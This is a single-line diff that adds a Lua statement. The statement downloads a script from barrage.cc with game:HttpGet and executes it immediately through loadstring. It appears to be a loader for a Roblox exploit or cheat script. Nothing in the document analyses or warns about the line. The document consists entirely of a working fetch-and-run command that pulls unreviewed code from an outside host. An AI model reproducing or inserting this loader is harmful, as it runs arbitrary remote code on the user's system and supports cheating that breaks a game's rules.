@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://barrage.cc/loader"))(124389216346675)
